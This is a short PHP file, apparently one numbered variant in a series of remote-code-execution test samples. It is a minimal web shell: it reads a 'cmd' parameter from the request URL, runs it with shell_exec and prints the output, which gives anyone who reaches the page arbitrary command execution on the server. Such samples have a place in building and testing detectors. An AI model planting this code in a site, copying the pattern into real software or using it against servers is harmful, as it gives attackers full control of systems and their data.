<?php
// RCE test variation #993
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>